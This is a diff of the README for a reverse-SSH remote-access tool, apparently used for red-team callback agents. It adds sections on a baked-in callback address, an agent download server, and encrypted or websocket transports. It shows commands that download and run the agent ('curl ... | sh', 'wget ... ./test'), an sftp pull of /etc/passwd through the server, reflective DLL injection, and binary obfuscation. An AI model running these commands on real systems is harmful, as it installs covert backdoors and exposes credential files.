@@ -43,8 +43,8 @@ And more!
     - [Running](#running)
   - [Setup Instructions](#setup-instructions)
   - [Fancy Features](#fancy-features)
-    - [Default Server](#default-server)
-    - [Built in Web Server](#built-in-web-server)
+    - [Baked in connect/call back address](#baked-in-connectcall-back-address)
+    - [Built in Agent Download Server](#built-in-agent-download-server)
     - [Windows DLL Generation](#windows-dll-generation)
     - [SSH Subsystem](#ssh-subsystem)
       - [All](#all)
@@ -186,7 +186,7 @@ sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .
 
 ## Fancy Features
 
-### Default Server
+### Baked in connect/call back address
 
 Specify a default server at build time:
 
@@ -200,7 +200,7 @@ $ bin/client
 $ bin/client -d example.com:3232
 ```
 
-### Built in Web Server
+### Built in Agent Download Server
 
 The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.
 
@@ -221,8 +221,12 @@ This requires the web server component has been enabled.
 	-C	Comment to add as the public key (acts as the name)
 	--goos	Set the target build operating system (default runtime GOOS)
 	--goarch	Set the target build architecture (default runtime GOARCH)
+	--goarm	Set the go arm variable (not set by default)
 	--name	Set the link download url/filename (default random characters)
 	--proxy	Set connect proxy address to bake it
+	--tls	Use TLS as the underlying transport
+	--ws	Use plain http websockets as the underlying transport
+	--wss	Use TLS websockets as the underlying transport
 	--shared-object	Generate shared object file
 	--fingerprint	Set RSSH server fingerprint will default to server public key
 	--garble	Use garble to obfuscate the binary (requires garble to be installed)
@@ -242,6 +246,12 @@ wget http://your.rssh.server.com:3232/test
 chmod +x test
 ./test
 ```
+
+The RSSH server also supports `.sh`, and `.py` URL path endings which will generate a script you can pipe into an intepreter:
+```sh
+curl http://your.rssh.server.com:3232/test.sh | sh
+```
+
 ### Windows DLL Generation 
 
 You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
